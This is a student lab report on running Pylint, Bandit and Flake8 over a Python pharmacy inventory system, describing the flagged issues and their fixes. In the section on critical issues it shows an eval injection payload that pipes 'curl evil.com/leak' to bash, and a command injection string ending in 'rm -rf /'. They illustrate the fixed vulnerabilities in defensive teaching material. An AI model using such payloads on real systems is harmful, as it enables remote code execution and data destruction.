# Lab 5: Static Code Analysis — Reflection & Analysis Report

**Student Name:** Gurijala Dheeraj Reddy  
**SRN:** PES2UG24AM059  
**Course:** Software Engineering (SE) Lab 5  
**Assigned System:** Pharmacy Management System (`SETAPESU26/L5_55_pharmacy-manager`)  

---

## Part 1: Core Static Analysis Reflection Questions

### Question 1: What types of issues were identified by each tool (Pylint, Bandit, Flake8), and how do their focuses differ?

Each tool operates on the Python source code using distinct inspection strategies, focusing on complementary aspects of code quality, security, and standardization:

1. **Flake8 (Style, Syntax, and PEP 8 Standardization):**
   - **Focus:** Acts as the codebase's syntax and formatting gatekeeper. Flake8 combines `PyFlakes` (syntax and logical analysis), `pycodestyle` (PEP 8 compliance), and `mccabe` (cyclomatic complexity).
   - **Issues Identified in `pharmacy_manager.py`:**
     - Unused imports (`F401 'sys' imported but unused`, `F401 'logging' imported but unused`).
     - Spacing violations (`E302 expected 2 blank lines, found 1`).
     - Line length violations (`E501 line too long (>79 characters)` on lines 19, 87, 98).
     - Bare exception blocks (`E722 do not use bare 'except'`).
     - Post-definition spacing (`E305 expected 2 blank lines after function definition`).

2. **Bandit (Security Vulnerabilities & Common Weakness Enumerations):**
   - **Focus:** A dedicated security scanner that builds and traverses Python Abstract Syntax Trees (ASTs) to flag dangerous functions, insecure patterns, and potential CWE vulnerabilities before code reaches production.
   - **Issues Identified in `pharmacy_manager.py`:**
     - **High Severity:** Shell injection via `os.system` (B605 / CWE-78) in `printLabel`; use of weak, collision-prone MD5 hashing (B324 / CWE-327) in `patientId`.
     - **Medium Severity:** Remote code execution risk via `eval()` (B307 / CWE-78) in `calculateDosage`; unsafe object deserialization via `pickle` (B301, B403 / CWE-502) in `saveStock`/`loadStock`.
     - **Low Severity:** Hardcoded cleartext password string (B105 / CWE-259) in `DB_PASSWORD`; try-except-pass error suppression (B110 / CWE-703) in `dispenseMedicine`; predictable pseudo-random number generator (B311 / CWE-330) in `generateRxNumber`.

3. **Pylint (Design, Maintainability, Code Smells & Logical Errors):**
   - **Focus:** Comprehensive static code reviewer that performs semantic analysis, evaluates coding standards, detects code smells, flags dangerous constructs, and calculates an overall code maintainability score (0 to 10).
   - **Issues Identified in `pharmacy_manager.py`:**
     - Dangerous mutable default arguments (`W0102: Dangerous default value [] as argument`).
     - Unclosed file descriptors (`R1732: Consider using 'with' for resource-allocating operations`).
     - Global state manipulation (`W0603: Using the global statement`).
     - Inconsistent naming conventions (`C0103: Function name doesn't conform to snake_case naming style`).
     - Missing docstrings for modules and functions (`C0114`, `C0116`).
     - Redundant conditional logic (`R1703`, `R1705`).
     - Initial score: **4.83 / 10**; Final optimized score: **10.00 / 10**.

---

### Question 2: Which issue was the most critical to fix and why?

The two most critical issues were the **arbitrary code execution through `eval(formula)` (Bandit B307)** and the **command injection through `os.system(...)` (Bandit B605)**, closely followed by the silent logical corruption caused by the **mutable default argument `audit=[]` (Pylint W0102)**:

1. **Security Perspective — `eval()` and `os.system()`:**
   - In `calculateDosage(formula)`, invoking `eval()` on an input string intended to compute prescription doses (e.g., `"250 * 2"`) creates a severe Remote Code Execution (RCE) vector. If an attacker passes a payload like `__import__('os').system('curl evil.com/leak | bash')`, arbitrary instructions execute with the full privileges of the host process.
   - In `printLabel(name)`, calling `os.system("echo Dispensing label: " + name)` allows direct command injection through filename or medicine input strings containing semicolons or pipes (e.g. `"Paracetamol; rm -rf /"`).
   - **Remediation:** `eval()` was replaced with a recursive AST evaluator (`ast.parse(formula, mode='eval')`) that strictly permits arithmetic binary operators (`+`, `-`, `*`, `/`) and numeric constants, rejecting any function calls, variable bindings, or imports. `os.system()` was eliminated entirely in favor of safe Python printing.

2. **Domain Logic Perspective — Mutable Default Argument `audit=[]`:**
   - In Python, default parameter expressions are evaluated **once** at function definition time when the module is loaded, not per call.
   - When multiple medicines were added without supplying an explicit `audit` argument, `audit.append(...)` mutated the single, shared list instance in memory.
   - As a result, medicine A's audit history leaked into medicine B's audit history, completely violating medical audit trails and data integrity.
   - **Remediation:** Changed default to `audit=None` and instantiated a fresh list `audit = []` within the function scope when `audit is None`.

---

### Question 3: How does incorporating static analysis tools into a CI/CD pipeline benefit software development?

Integrating Pylint, Bandit, and Flake8 into an automated Continuous Integration/Continuous Deployment (CI/CD) workflow (e.g., GitHub Actions, GitLab CI) provides transformative engineering benefits:

1. **Shift-Left Security & Vulnerability Prevention:**
   - Security flaws (like hardcoded API tokens, insecure deserialization, or unvalidated inputs) are intercepted in feature branches before human code review and long before reaching production servers.
2. **Automated Quality Gates:**
   - Pipelines enforce strict thresholds (e.g., `pylint --fail-under=9.5` and `bandit -r . --severity-level medium`). If a commit introduces a vulnerability or drops code quality, the build fails automatically, preventing defective code from merging into `main`.
3. **Elimination of Style Debates in Pull Requests:**
   - Automated Flake8 checks ensure that all team members conform strictly to PEP 8. Code reviewers can focus entirely on software architecture, business logic, and algorithm correctness rather than indentation or unused imports.
4. **Reduced Technical Debt & Maintenance Costs:**
   - Regular static scanning prevents code decay, memory/file descriptor leaks (`consider-using-with`), and dead code accumulation, significantly reducing regression triage time.

---

### Question 4: What are the limitations of static code analysis, and why is manual code review or dynamic testing still necessary?

While static code analysis is indispensable, it has fundamental theoretical and practical boundaries:

1. **Inability to Verify Domain Business Logic:**
   - Static tools inspect syntax trees, token streams, and control flow graphs; they have no concept of domain semantics.
   - In `pharmacy_manager.py`, the initial script successfully ran:
     - `addMedicine("Cetirizine 10mg", -10, 2.0)` -> created negative stock (-10 units).
     - `addMedicine(404, 25)` -> accepted an integer as a medicine name.
     - `billAmount([("Amoxicillin 250mg", 5)])` -> billed expired medications to patients.
     None of these logical disasters triggered a Bandit or Flake8 error because the syntax was completely valid Python. Only domain-specific logic validation and unit testing can detect these flaws.
2. **Lack of Runtime & Environment Context:**
   - Static analysis cannot detect concurrency race conditions, database deadlocks, network timeouts, OS-level permission errors, or dynamic configuration mismatches.
3. **False Positives and False Negatives:**
   - Tools may flag safe code (e.g., Bandit flagging `hashlib.md5` when used solely for non-cryptographic checksum caching) or fail to detect indirect vulnerabilities where malicious input flows across complex, dynamic object boundaries.
4. **Necessity of Dynamic Testing & Peer Review:**
   - Comprehensive unit tests (e.g., `pytest`), integration testing, fuzzing, dynamic application security testing (DAST), and human peer review remain essential to validate functional correctness, edge-case resilience, and architectural integrity.

---

## Part 2: Repository-Specific Technical Analysis (Pharmacy Manager)

### 1. Architecture & Concurrency Weaknesses in State Management
The system stores inventory in a global in-memory dictionary `MEDICINES = {}`.
- **Concurrency Hazards:** Python dictionaries are not thread-safe for compound check-then-act operations. In a multi-threaded web API or concurrent pharmacy environment, two pharmacists dispensing the same medicine concurrently could read the same quantity simultaneously, causing a double-dispense race condition and inventory drift.
- **Persistence Fragility:** Because changes reside in memory until `save_stock()` is called, an unexpected process termination, unhandled exception, or power failure results in unrecoverable inventory data loss. In production, this must be replaced with an ACID-compliant transactional relational database (PostgreSQL/SQLite) with row-level locks or optimistic concurrency control.

### 2. Insecure Deserialization (`pickle` vs. `json`)
`pickle` serializes arbitrary Python objects by encoding byte streams that include executable opcodes. When `pickle.load()` is called on an untrusted or tampered `.dat` file, Python can reconstruct malicious callable objects (using `__reduce__`), leading to arbitrary code execution. Migrating to `json` provides structured, language-agnostic data serialization with zero capability for code execution.

### 3. Error Handling Antipattern (`except: pass`)
The original `dispenseMedicine` function used:
```python
try:
    medicines[name]["qty"] -= qty
    if medicines[name]["qty"] <= 0:
        del medicines[name]
except:
    pass
```
Swallowing all exceptions indiscriminately masked both expected errors (attempting to dispense a non-existent medicine like `"Insulin"`) and critical programming errors (such as passing a non-numeric quantity). The updated implementation explicitly verifies inventory existence, expiry status, and available quantities, raising explicit `ValueError` exceptions with actionable diagnostic messages.

---

## Part 3: Conclusion & Key Learnings

Through this lab, static analysis transitioned from an abstract concept into a practical engineering workflow:
1. Identifying high-severity security vectors (`eval`, `os.system`, weak hashing, insecure serialization) and replacing them with robust, modern alternatives (`ast`, `secrets`, `hashlib.sha256`, `json`).
2. Eliminating subtle language pitfalls such as mutable default arguments and unclosed resource handles.
3. Elevating the codebase from a low **4.83 / 10** Pylint score with 8 security vulnerabilities and 22 style defects to a **flawless 10.00 / 10** Pylint rating, **0 Bandit vulnerabilities**, and **0 Flake8 style violations**.
